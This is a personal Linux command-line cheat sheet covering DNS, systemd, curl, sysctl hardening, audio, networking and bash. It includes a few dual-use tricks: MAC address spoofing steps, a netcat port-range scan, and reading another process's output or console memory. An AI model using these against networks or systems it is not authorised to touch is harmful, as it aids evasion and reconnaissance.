        RNAME: email address of a person responsible for the zone. the @ symbol is replaced by a "."
TXT:	Text record
----
resource record: [name] [ttl] [class] type rdata
--
name field:
@ : refer to the origin
fully-qualified domain name ends in period
relative domain name does not end in period
. : refer to the root
whitespace refers to the most recently specified domain name
--
class field: IN (internet)

google.com.             45 IN SOA ns1.google.com. dns-admin.google.com. (
                                333477116  ; serial
                                900        ; refresh (15 minutes)
                                900        ; retry (15 minutes)
                                1800       ; expire (30 minutes)
                                60         ; minimum (1 minute)
                                )
google.com.             238 IN A 216.58.194.142
google.com.             236 IN AAAA 2607:f8b0:4000:80d::200e
google.com.             171842 IN NS ns3.google.com.
google.com.             171842 IN NS ns4.google.com.
google.com.             171842 IN NS ns1.google.com.
google.com.             171842 IN NS ns2.google.com.
google.com.             210     IN      MX      10 aspmx.l.google.com.
google.com.             210     IN      MX      30 alt2.aspmx.l.google.com.
google.com.             210     IN      MX      40 alt3.aspmx.l.google.com.
google.com.             210     IN      MX      20 alt1.aspmx.l.google.com.
google.com.             210     IN      MX      50 alt4.aspmx.l.google.com.
google.com.             300     IN      TXT     "docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e"
google.com.             300     IN      TXT     "globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8="
google.com.             300     IN      TXT     "v=spf1 include:_spf.google.com ~all"
google.com.             300     IN      TXT     "facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95"
google.com.             300     IN      TXT     "docusign=1b0a6754-49b1-4db5-8540-d2c12664b289"

shuf -n1 -e /bin/* /sbin/*  #generate random permutation

whatis: display a one-line manual description

#curl: send form data
curl --form "username=seth" --form "password=12345678" "https://example.com/api/v4/endpoint"
#curl: send file as form data
curl --form "profile=@me.jpg" "https://example.com/foo/bar"

cat /proc/sys/fs/inotify/max_user_watches   #maximum # of files to watch for changes (inotify watchers)
to change, edit /etc/sysctl.conf, add:
fs.inotify.max_user_watches=524288
then do "sudo sysctl -p" to load the change

#display any line that begins with string
look -f <string> <filename>

#make a pdf of a manual page
man -t zshexpn | ps2pdf - > zshexpn.pdf

rsync -az -e ssh --delete ~/public_html/ remote.com:'~/public_html'	#Mirror web site (using compression and encryption)
rsync -auz -e ssh remote:/dir/ . && rsync -auz -e ssh . remote:/dir/	#Synchronize current directory with remote one

/etc/systemd/journald.conf
#journalctl data:
/var/log/journal/<machine-id>/*.journal

#calculate the number of days between 2 dates
echo "("$(date -d "2020-06-06" +%s) - $(date -d "2020-03-17" +%s)") / 86400" | bc

showing the decimal equivalent of a hexadecimal or octal number.
echo $((0xdeadbeef)) # Outputs 3735928559
echo $((0127)) # Outputs 87 #bash only, not zsh

gunzip -t data.tar.gz #test gzipped file
gunzip -c data.tar.gz | tar t > /dev/null #test integrity of tar file

$ tree -Jhfpug
[{"type":"directory","name": ".","contents":[
    {"type":"file","name":"./notes-az.txt","mode":"0644","prot":"-rw-r--r--","user":"cheok","group":"cheok","size":"3.9K"},
    {"type":"file","name":"./notes-env.txt","mode":"0644","prot":"-rw-r--r--","user":"cheok","group":"cheok","size":"8.0K"},
    {"type":"file","name":"./notes-share.txt","mode":"0644","prot":"-rw-r--r--","user":"cheok","group":"cheok","size":"69"},
    {"type":"file","name":"./notes-test.txt","mode":"0644","prot":"-rw-r--r--","user":"cheok","group":"cheok","size":"9.3K"}
  ]},
  {"type":"report","directories":0,"files":9}
]

/etc/sysctl.conf:
Disable IP forwarding
net.ipv4.ip_forward=0
--
Disable Send Packet Redirects
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
--
Disable ICMP Redirect Acceptance
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
--
Enable Bad Error Message Protection
net.ipv4.icmp_ignore_bogus_error_responses = 1
--
Enable SYN cookies to ensure a server avoids dropping connections when the SYN queue fills up
net.ipv4.tcp_syncookies = 1
--
Increase the SYS backlog queue size to 2048
net.ipv4.tcp_max_syn_backlog = 2048
--
close the SYN_RECV state connections earlier
net.ipv4.tcp_synack_retries = 3
--
Lowers the timeout value for SYN_RECV to help in reducing the SYN flood attack
net.ipv4.netfilter.ip_conntrack_tcp_timeout_syn_recv=45

#check if a program is PAM-aware (PAM: Pluggable Authentication Modules)
/etc/pam.d
sudo ldd /usr/sbin/sshd | grep libpam.so
--
https://www.tecmint.com/configure-pam-in-centos-ubuntu-linux/

curl with cookie:
curl -b JSESSIONID=517A027B9C96F92F0818A62295B93140 <URL>
--
curl --trace-ascii <file>

jbd2 is a kernel thread that updates the filesystem journal. Tracing filesystem or disk activity
with the process that caused it is difficult because the activities of many processes are combined
together.

systemd-resolved:
---
Using the systemd DNS stub file - the systemd DNS stub file /run/systemd/resolve/stub-resolv.conf
contains the local stub 127.0.0.53 as the only DNS server and a list of search domains. This is the
recommended mode of operation.  The service users are advised to redirect the /etc/resolv.conf file
to the local stub DNS resolver file /run/systemd/resolve/stub-resolv.conf managed by
systemd-resolved.
--
systemd-resolved will be used automatically if /etc/resolv.conf is a symlink to
/run/systemd/resolve/stub-resolv.conf, /run/systemd/resolve/resolv.conf or
/usr/lib/systemd/resolv.conf
--
/etc/systemd/resolved.conf
--
/etc/resolv.conf is a symbolic link to /run/resolvconf/resolv.conf
--
systemd-resolve --status #same output as resolvectl
resolvectl query github.com
resolvectl statistics
===
/run/systemd/resolve/stub-resolv.conf:
nameserver 127.0.0.53
options edns0
search attlocal.net
===
/run/resolvconf/resolv.conf:
nameserver 127.0.0.53
search attlocal.net
---
/lib/systemd/systemd-resolved listens on port 53: output of lsof:
systemd-r 412 systemd-resolve   12u  IPv4  16951      0t0  UDP 127.0.0.53:53
systemd-r 412 systemd-resolve   13u  IPv4  16952      0t0  TCP 127.0.0.53:53 (LISTEN)

There are 2 kinds of DNS servers: authoritative and recursive.
authoritative DNS servers (also known as nameservers) have a database of IP addresses for each domain they’re responsible for
--
recursive DNS servers, by themselves, don’t know anything about who owns what IP address. They
figure out the IP address for a domain by asking the right authoritative DNS servers, and then cache
that IP address in case they’re asked again. 8.8.8.8 is a recursive DNS server.
===
https://www.iana.org/domains/root/files
---
Unbound is a validating, recursive, caching DNS resolver:
https://github.com/NLnetLabs/unbound
---
stub resolver -> recursive resolver (or “caching DNS server”) -> authoritative name servers
--
The DNS stub resolver is a component of the DNS that is accessed by application programs when using
the DNS for e.g. resolving domain names to IP addresses. The stub resolver simply serves as an
intermediary between the application requiring DNS resolution, and a recursive DNS resolver.
---
All DNS servers fall into one of four categories: Recursive resolvers, root nameservers, TLD
nameservers, and authoritative nameservers.
--
A recursive resolver (also known as a DNS recursor) is the first stop in a DNS query. The recursive
resolver acts as a middleman between a client and a DNS nameserver. After receiving a DNS query from
a web client, a recursive resolver will either respond with cached data, or send a request to a root
nameserver, followed by another request to a TLD nameserver, and then one last request to an
authoritative nameserver. After receiving a response from the authoritative nameserver containing
the requested IP address, the recursive resolver then sends a response to the client.
--
The authoritative nameserver contains information specific to the domain name it serves
(e.g. google.com) and it can provide a recursive resolver with the IP address of that server found
in the DNS A record, or if the domain has a CNAME record (alias) it will provide the recursive
resolver with an alias domain, at which point the recursive resolver will have to perform a whole
new DNS lookup to procure a record from an authoritative nameserver (often an A record containing an
IP address).
---
DNS lookup:
1. A user types ‘example.com’ into a web browser and the query travels into the Internet and is received by a DNS recursive resolver.
2. The resolver then queries a DNS root nameserver (.).
3. The root server then responds to the resolver with the address of a Top Level Domain (TLD) DNS
   server (such as .com or .net), which stores the information for its domains. When searching for
   example.com, our request is pointed toward the .com TLD.
4. The resolver then makes a request to the .com TLD.
5. The TLD server then responds with the IP address of the domain’s nameserver, example.com.
6. Lastly, the recursive resolver sends a query to the domain’s nameserver.
7. The IP address for example.com is then returned to the resolver from the nameserver.
8. The DNS resolver then responds to the web browser with the IP address of the domain requested initially.
---
The recursive resolver also has additional functionality depending on the types of records it has in its cache:
--
If the resolver does not have the A records, but does have the NS records for the authoritative
nameservers, it will query those name servers directly, bypassing several steps in the DNS
query. This shortcut prevents lookups from the root and .com nameservers (in our search for
example.com) and helps the resolution of the DNS query occur more quickly.
--
If the resolver does not have the NS records, it will send a query to the TLD servers (.com in our
case), skipping the root server.
--
In the unlikely event that the resolver does not have records pointing to the TLD servers, it will
then query the root servers. This event typically occurs after a DNS cache has been purged.
--
DNS zone: domain minus the subdomains that have been delegated elsewhere. DNS zone data
DNS domain name: www.foo.example

https://www.internetsociety.org/resources/deploy360/dns-privacy/intro

nm-online #check whether online

===========
send dhcp request from command line
$ sudo nmap --script broadcast-dhcp-discover -e eth1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 13:16 PDT
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.68
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.254
|     IP Address Lease Time: 1d00h00m00s
|     Renewal Time Value: 12h00m00s
|     Rebinding Time Value: 21h00m00s
|     Domain Name Server: 192.168.1.254
|     Router: 192.168.1.254
|     Subnet Mask: 255.255.255.0
|_    Time Offset: 4294942096

if all file descriptors referring to the write end of a pipe have been closed, then an attempt to
read from the pipe will see end-of-file (read() will return 0).  If all file descriptors referring
to the read end of a pipe have been closed, then a write() will cause a SIGPIPE signal to be
generated for the calling process.  If the calling process is ignoring this signal, then write()
fails with the error EPIPE.

ip -br a
ip -s -h l show eth1 #-s: show stats , -h: human-readable
ip a show eth1
ip n #neighbor , show arp info
ip link show <interface>
#spoof MAC address
1. ip link show <interface> #check your current address
2. ip link set dev <interface> down #bring down network interface
3. ip link set dev <interface> address XX:XX:XX:XX:XX:XX
   first 3 bytes identify vendor.
   https://en.wikipedia.org/wiki/Organizationally_unique_identifier
4. ip link set dev <interface> up #bring up network interface

sha256sum --ignore-missing -c sha256sum.txt

udisksctl info --block-device /dev/sda

$ sudo file -s /dev/sda
/dev/sda: DOS/MBR boot sector

GRUB stands for GRand Unified Bootloader. Its function is to take over from BIOS at boot time, load
itself, load the Linux kernel into memory, and then turn over execution to the kernel.

sound stuff:
sinks: "places where sound stream goes away"
--
pacmd
--
pactl list short sinks
->
0       alsa_output.pci-0000_00_1b.0.analog-stereo      module-alsa-card.c      s16le 2ch 44100Hz       RUNNING
# show current state
pactl list sinks |egrep -e 'Sink|State|Mute'
-- use long name or index num
pactl set-sink-mute alsa_output.pci-0000_00_1b.0.analog-stereo toggle
--
pactl set-sink-mute 0 toggle #this works: toggle speaker
--
Switch mute on, that is sound off:
pactl set-sink-mute 1 1
--
Switch mute off, that is sound on:
pactl set-sink-mute 1 0
--
alsamixer
amixer scontrols
--
set the volume on the Master control/property of the first sound card to 100%
$ amixer -c 0 set Master 100%
--
set the volume on the Speaker control/property of the second sound card to 50%
$ amixer -c 1 set Speaker 50%
--
to mute and unmute a property.
$ amixer -c 0 set Mic mute
$ amixer -c 0 set Mic unmute
--
amixer -q -D pulse sset Master toggle #toggle speaker??
--
https://vitux.com/control-audio-volume-through-the-ubuntu-command-line/

A microcode is nothing but CPU firmware provided by Intel or AMD. The Linux kernel can update the
CPU's firmware without the BIOS update at boot time. Processor microcode is stored in RAM and kernel
update the microcode during every boot.

convert between base 10 and 16 (decimal <-> hexadecimal)
-- hexadecimal to decimal
$ echo "ibase=16;8A31" | bc
35377
$ printf "%d\n" 0x8A31
35377
-- decimal to hexadecimal
$ echo "obase=16;35377" | bc
8A31
$ printf "%x\n" 35377
8a31

systemd.path — Path unit configuration
A unit configuration file whose name ends in ".path" encodes information about a path monitored by systemd, for path-based activation.
https://www.freedesktop.org/software/systemd/man/systemd.path.html

#print memory zone and node info
cat /proc/buddyinfo
Node 0, zone      DMA      1      1      0      0      2      1      1      0      1      1      3
Node 0, zone    DMA32   5124   3884   3007   1314    541    182     77     42     12      3    150
Node 0, zone   Normal     62      2      1      1      5      2      3     19     19      0      0
--
Direct Memory Access (DMA): This is the low 16 MB of memory
Direct Memory Access 32: Despite its name, Direct Memory Access 32 (DMA32) is a zone only found in
  64-bit Linux. It’s the low 4 GB of memory.
Normal: On 64-bit computers, normal memory is all of the RAM above 4GB (roughly).
--
cat /proc/zoneinfo

vm.dirty_background_ratio is the percentage of system memory that can be filled with “dirty” pages —
memory pages that still need to be written to disk — before the pdflush/flush/kdmflush background
processes kick in to write it to disk. We suggest setting it to 1%, so if your virtual server has 64
GB of memory that’s ~2/3 GB of data that can be sitting in RAM before something is done.
--
vm.dirty_background_ratio=1

vm.dirty_ratio is the absolute maximum amount of system memory that can be filled with dirty pages
before everything must get committed to disk. When the system gets to this point all new I/O blocks
until dirty pages have been written to disk. This is often the source of long I/O pauses, but is a
safeguard against too much data being cached unsafely in memory.
--
vm.dirty_ratio=40

when you do "systemctl enable <service", create a symbolic link in:
/etc/systemd/system/multi-user.target.wants

sudo -ll

vcs, vcsa - virtual console memory. It refers to the memory of the currently displayed virtual
  console terminal.
--
/dev/vcs devices: each correspond to the /dev/tty devices with the same number
--
sudo cat /dev/vcs1

#scan port range
nc -zv <ip> 20-90 2>&1 | grep succeeded

#check run level
who -r
#change run level to 5
sudo init 5

grub:
gfxpayload
If this variable is set, it controls the video mode in which the Linux kernel starts up, replacing
the ‘vga=’ boot option. It may be set to ‘text’ to force the Linux kernel to boot in
normal text mode, ‘keep’ to preserve the graphics mode set using ‘gfxmode’, or any of the permitted
values for ‘gfxmode’ to set a particular graphics mode.
---
gfxmode
If this variable is set, it sets the resolution used on the ‘gfxterm’ graphical terminal. Note that
you can only use modes which your graphics card supports via VESA BIOS Extensions (VBE), The default
is ‘auto’, which selects a platform-specific default that should look reasonable. Supported modes
can be listed by ‘videoinfo’ command in GRUB.
--
https://www.gnu.org/software/grub/manual/grub/html_node/Simple-configuration.html

$vt_handoff : The grub configuration has established a grub variable called vt_handoff and populated
it (or not) with a value indicating which virtual console should be the primary graphic console and
show the display manager.
--
vt.handoff (vt = virtualterminal) is a kernel boot parameter unique to Ubuntu, and is not an
upstream kernel boot parameter. Its purpose is to allow the kernel to maintain the current contents
of video memory on a virtual terminal. So, when the operating system is booting up, when it moves
past the boot loader, vt.handoff allows showing of an aubergine background, with Plymouth displaying
a logo and progress indicator bar on top of this. Once the display manager comes up, it smoothly
replaces this with a login prompt.

overwrite noclobber:
echo another >| f1
echo another >! f1

Dynamic Kernel Module Support (DKMS) is a program/framework that enables generating Linux kernel
modules whose sources generally reside outside the kernel source tree. The concept is to have DKMS
modules automatically rebuilt when a new kernel is installed.

== shell script stuff ==
#execute some command

exit_status=$?
if [[ $exit_status -ne 0 ]]; then
    exit 1
fi
if [[ $exit_status -eq 0 ]]; then
    exit 0
fi
== end shell script stuff ==

/etc/X11/default-display-manager
/proc/partitions
/proc/devices
/sys/devices
/sys/block

/dev/snd : sound device

kernel send notification (uevent) to a user space process (udevd)
upon detecting a new device.
/lib/udev/rules.d : default
/etc/udev/rules.d : overrides

/dev/disk/by-id
/dev/disk/by-label

tmpfs: use physical memory and swap space as temporary storage

/proc/self: the current process

filesystem: transform a block device into a hierarchy of files and directories

systemctl show #show properties
systemctl show lightdm
systemctl show -p Requires lightdm
systemctl show -p Wants lightdm
systemctl -p UnitPath show
--
systemd unit dir: /lib/systemd
systemd config dir: /etc/systemd
--
$ pkg-config systemd --variable=systemdsystemunitdir
/lib/systemd/system
$ pkg-config systemd --variable=systemdsystemconfdir
/etc/systemd/system

systemd-cgls

ltrace #library call tracer

/etc/login.defs # Configuration control definitions for the login package.

PulseAudio: user-facing layer of Linux audio system.
~/.config/pulse
/etc/pulse
--
pulseaudio -k : kill daemon
pulseaudio -D : restart

kernel read initramfs into a temp FS, mount it at /, then hand off
to init on initramfs. the temp init load driver modules, mount root filesystem
and start true init.

echo $0 -> zsh
echo $0 -> -zsh #login shell

dbus-daemon #there is a system instance and a session instance
---
dbus-monitor --session
dbus-monitor --system
--
/etc/dbus-1
---
/var/run/dbus/system_bus_socket

--file association
when I make a change:
~/.config/mimeapps.list
--
other location:
~/.local/share/applications/mimeapps.list
--
file association
/usr/share/applications/firefox.desktop
MimeType=
---
/usr/share/mime/mime.cache
/usr/share/mime/types

nmcli wifi command line:
nmcli dev wifi #show access points
--
nmcli --ask dev wifi connect <SSID> #ask for password
---
nmcli con up <id>
nmcli con down <id>
---
nmcli d disconnect wlan0
nmcli c modify id ipoh connection.autoconnect no
--
nmcli radio wifi on/off
nmcli g reload
nmcli c reload

linux printing:
1. convert document into PostScript (optional)
2. send the document to print server
3. print server put document on a print queue.
4. print server send document to print filter
5. if not in PostScript, print filter may perform conversion
6. printer driver convert document to printer-compatible format if necessary
7. printer driver adds optional instructions, such as paper tray, duplexing
8. print server send document to printer

flex: GNU alternative to lex
bison: GNU alternative to yacc

Autoconf: run ./configure to generate Makefile (templates: Makefile.in and config.h.in)

NetworkManager config:
man nm-settings
man nm-settings-keyfile

The systemd-journal-flush.service asks the journal daemon to flush any log data stored in
/run/log/journal into /var/log/journal.
-- to see info
journalctl -b --unit systemd-journald
--
systemctl show systemd-journal-flush.service
systemctl cat systemd-journal-flush.service

RFC 3066 language tag, example: en_US
consist of two parts:
ISO 639 language code + ISO 3166 country code
--
https://pubs.opengroup.org/onlinepubs/7908799/xbd/envvar.html
--
LANG : This variable determines the locale category for native language, local customs and coded
character set in the absence of the LC_ALL and other LC_* (LC_COLLATE, LC_CTYPE, LC_MESSAGES,
LC_MONETARY, LC_NUMERIC, LC_TIME) environment variables. This can be used by applications to
determine the language to use for error messages and instructions, collating sequences, date
formats, and so forth.

LC_ALL :  This variable  determines the  values for  all locale  categories. The  value of  the LC_ALL
environment variable has  precedence over any of  the other environment variables  starting with LC_
(LC_COLLATE,  LC_CTYPE, LC_MESSAGES,  LC_MONETARY,  LC_NUMERIC, LC_TIME)  and  the LANG  environment
variable.

LC_CTYPE : This variable determines the locale category for character handling functions, such as
tolower(), toupper() and isalpha(). This environment variable determines the interpretation of
sequences of bytes of text data as characters (for example, single- as opposed to multi-byte
characters), the classification of characters (for example, alpha, digit, graph) and the behaviour
of character classes. Additional semantics of this variable, if any, are implementation-dependent.

chrt: manipulate the real-time attributes of a process
chrt -m # show min and max priority
chrt -p 956 #pid
pid 956's current scheduling policy: SCHED_OTHER
pid 956's current scheduling priority: 0
--
see man sched_setscheduler

#kernel slab memory cache
sudo cat /proc/slabinfo

Polkit is used for controlling system-wide privileges. It provides an organized way for
non-privileged processes to communicate with privileged ones.

bash dictionary:
declare -A animals=( ["moo"]="cow" ["woof"]="dog")
OR:
declare -A animals
animals=( ["moo"]="cow" ["woof"]="dog")
--
echo "${animals[@]}" #show all values
dog cow
echo "${!animals[@]}" #show all keys
woof moo
---
echo "${animals[moo]}" #get one key
--iterate:
for sound in "${!animals[@]}"; do echo "$sound - ${animals[$sound]}"; done

== check exit status
ls blah #some command
exit_status=$?
if [[ $exit_status -ne 0 ]]; then
    echo "error"
    exit 1
fi
== check exit status

#find my DNS server
nmcli d show | grep DNS

sudo systemd-resolve --flush-caches

/proc/sys/kernel/threads-max

echo "HelLo" | tr '[:upper:]' '[:lower:]'

#running .desktop file from CLI
gtk-launch org.kde.spectacle.desktop #assume the file is in /usr/share/applications or ~/.local/share/applications
kioclient5 exec /usr/share/applications/org.kde.spectacle.desktop

#utilities for desktop files:
desktop-file-edit
desktop-file-install
desktop-file-validate
-- desktop-file-validate ~/.local/share/applications/emacs.desktop

#get stdout of a process:
tail -f /proc/$PID/fd/1

$ cat /sys/fs/cgroup/blkio/blkio.throttle.read_bps_device
$ cat /sys/fs/cgroup/blkio/blkio.throttle.write_bps_device

the child inherits a copy of the file descriptors of the parent. For example, if the parent had file
descriptor 5 in use for a particular file when the parent creates the child, the child will also
have file descriptor 5 in use for that same file.

committed memory: how much total memory space all applications have reserved for use

linux bridge is like a network switch. it forwards packets between interfaces that are connected to it.
Linux Bridge – a technology originally intended exactly for creating virtual local area networks.
like a L3 switch

VETH: is a local ethernet tunnel. created in pairs.  The veth devices are virtual Ethernet devices.
They can act as tunnels between network namespaces to create a bridge to a physical network device
in another namespace, but can also be used as standalone network devices.
command: ip link add <p1-name> type veth peer name <p2-name>

When configuring a Linux bridge, use the following commands to enforce isolation:
bridge vlan del dev br0 vid 1 self
echo 1 > /sys/class/net/br0/bridge/vlan_filtering
--
https://vincent.bernat.ch/en/blog/2017-linux-bridge-isolation

ethtool -S <veth-name> # Discover interface index of peer
--> NIC statistics:
    peer_ifindex: 16
then do ip link | grep '^16:' to look up interface

nsupdate is used to submit Dynamic DNS Update requests to a name server
